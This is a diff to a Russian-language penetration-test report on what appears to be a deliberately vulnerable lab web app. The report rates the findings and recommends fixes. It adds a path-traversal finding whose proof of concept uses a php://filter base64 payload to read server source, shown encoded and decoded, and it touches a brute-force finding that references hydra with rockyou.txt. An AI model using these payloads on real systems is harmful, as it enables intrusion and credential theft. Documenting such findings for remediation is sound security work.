@@ -189,7 +189,7 @@ $ dirsearch -u http://92.51.39.105:7788
    
 **Страница:**`http://92.51.39.106:8050/users/login.php`\
 **Критичность:** Средняя\
-**Описание:** На странице существует возможность выполнения атак методом "грубой силы" (BruteForce), т.к. не установлен лимит на попытки ввода пары логин/пароль.\
+**Описание:** на странице существует возможность выполнения атак методом "грубой силы" (BruteForce), т.к. не установлен лимит на попытки ввода пары логин/пароль.\
 **Рекомендации для исправления:** установление ограничения попыток ввода пары логин/пароль и внедрение механизма ограничения попыток авторизации по IP-адресу.
 
 <details>
@@ -213,6 +213,84 @@ hydra -l hackme -P "/home/kali/Downloads/rockyou.txt" -s 8050 92.51.39.106 http-
 Спустя некоторое время получаем валидную пару логин/пароль:
 
 ![](pics/hydra_user_hacked.png)
+
+</details>
+
+4. **Уязвимость Path Traversal** ([A01:2021-Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/))
+
+**Страница:** `http://92.51.39.106:8050/admin/index.php?page=login`\
+**Критичность:** Высокая\
+**Описание:** на странице есть возможность обращения к файловой системе через параметр запроса.\
+**Рекомендация для исправления:** валидация значений параметров запросов.
+
+<details>
+<summary><b>Реализация (Proof of Concept)</b></summary>
+
+- выполнить переход на страницу `http://92.51.39.106:8050/admin/index.php?page=login`;
+- значение параметра `page=login` заменить на `page=php://filter/read=convert.base64-encode/resource=../users/login`;
+- получаем зашифрованный код страницы в `base64`:
+
+![](pics/base64_encoded_page.png)
+
+```sh
+PD9waHANCg0KcmVxdWlyZV9vbmNlKCIuLi9pbmNsdWRlL3VzZXJzLnBocCIpOw0KcmVxdWlyZV9vbmNlKCIuLi9pbmNsdWRlL2h0bWxfZnVuY3Rpb25zLnBocCIpOw0KcmVxdWlyZV9vbmNlKCIuLi9pbmNsdWRlL2Z1bmN0aW9ucy5waHAiKTsNCg0KLy8gbG9naW4gcmVxdWlyZXMgdXNlcm5hbWUgYW5kIHBhc3N3b3JkIGJvdGggYXMgUE9TVC4gDQokYmFkX2xvZ2luID0gIShpc3NldCgkX1BPU1RbJ3VzZXJuYW1lJ10pICYmIGlzc2V0KCRfUE9TVFsncGFzc3dvcmQnXSkpOw0KaWYgKGlzc2V0KCRfUE9TVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9QT1NUWydwYXNzd29yZCddKSkNCnsNCiAgIGlmICgkdXNlciA9IFVzZXJzOjpjaGVja19sb2dpbigkX1BPU1RbJ3VzZXJuYW1lJ10sICRfUE9TVFsncGFzc3dvcmQnXSwgVHJ1ZSkpDQogICB7DQogICAgICBVc2Vyczo6bG9naW5fdXNlcigkdXNlclsnaWQnXSk7DQogICAgICBpZiAoaXNzZXQoJF9QT1NUWyduZXh0J10pKQ0KICAgICAgew0KCSBodHRwX3JlZGlyZWN0KCRfUE9TVFsnbmV4dCddKTsNCiAgICAgIH0NCiAgICAgIGVsc2UNCiAgICAgIHsNCgkgaHR0cF9yZWRpcmVjdChVc2Vyczo6JEhPTUVfVVJMKTsNCiAgICAgIH0NCiAgIH0NCiAgIGVsc2UNCiAgIHsNCiAgICAgICRiYWRfbG9naW4gPSBUcnVlOw0KICAgICAgJGZsYXNoWydlcnJvciddID0gIlRoZSB1c2VybmFtZS9wYXNzd29yZCBjb21iaW5hdGlvbiB5b3UgaGF2ZSBlbnRlcmVkIGlzIGludmFsaWQiOw0KICAgfQ0KfQ0KaWYgKCRiYWRfbG9naW4pDQp7DQogICBvdXJfaGVhZGVyKCk7DQoNCiAgID8+DQoNCjxkaXYgY2xhc3M9ImNvbHVtbiBwcmVwZW5kLTEgc3Bhbi0yMyBmaXJzdCBsYXN0Ij4NCiAgICA8aDI+TG9naW48L2gyPg0KICAgIDw/cGhwIGVycm9yX21lc3NhZ2UoKTsgPz4NCiAgICA8dGFibGUgc3R5bGU9IndpZHRoOjMyMHB4IiBjZWxsc3BhY2luZz0iMCI+DQogICAgICA8Zm9ybSBhY3Rpb249Ijw/PWgoICRfU0VSVkVSWydQSFBfU0VMRiddICk/PiIgbWV0aG9kPSJQT1NUIj4NCiAgICAgIDx0cj48dGQ+VXNlcm5hbWUgOjwvdGQ+PHRkPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIC8+PC90ZD48L3RyPg0KICAgICAgPHRyPjx0ZD5QYXNzd29yZCA6PC90ZD48dGQ+IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PC90ZD48L3RyPg0KICAgICAgPHRyPjx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ibG9naW4iIC8+PC90ZD48dGQ+IDxhIGhyZWY9Ii91c2Vycy9yZWdpc3Rlci5waHAiPlJlZ2lzdGVyPC9hPjwvdGQ+PC90cj4NCiAgIDwvZm9ybT4NCiA8L3RhYmxlPg0KPC9kaXY+DQogICA8P3BocA0KDQogICAgICAgb3VyX2Zvb3RlcigpOw0KfQ0KDQoNCj8+
+```
+
+Дешифрованный код страницы:
+
+```sh
+<?php
+
+require_once("../include/users.php");
+require_once("../include/html_functions.php");
+require_once("../include/functions.php");
+
+// login requires username and password both as POST. 
+$bad_login = !(isset($_POST['username']) && isset($_POST['password']));
+if (isset($_POST['username']) && isset($_POST['password']))
+{
+   if ($user = Users::check_login($_POST['username'], $_POST['password'], True))
+   {
+      Users::login_user($user['id']);
+      if (isset($_POST['next']))
+      {
+	 http_redirect($_POST['next']);
+      }
+      else
+      {
+	 http_redirect(Users::$HOME_URL);
+      }
+   }
+   else
+   {
+      $bad_login = True;
+      $flash['error'] = "The username/password combination you have entered is invalid";
+   }
+}
+if ($bad_login)
+{
+   our_header();
+
+   ?>
+
+<div class="column prepend-1 span-23 first last">
+    <h2>Login</h2>
+    <?php error_message(); ?>
+    <table style="width:320px" cellspacing="0">
+      <form action="<?=h( $_SERVER['PHP_SELF'] )?>" method="POST">
+      <tr><td>Username :</td><td> <input type="text" name="username" /></td></tr>
+      <tr><td>Password :</td><td> <input type="password" name="password" /></td></tr>
+      <tr><td><input type="submit" value="login" /></td><td> <a href="/users/register.php">Register</a></td></tr>
+   </form>
+ </table>
+</div>
+   <?php
+
+       our_footer();
+}
+
+?>
+```
 
 </details>
   
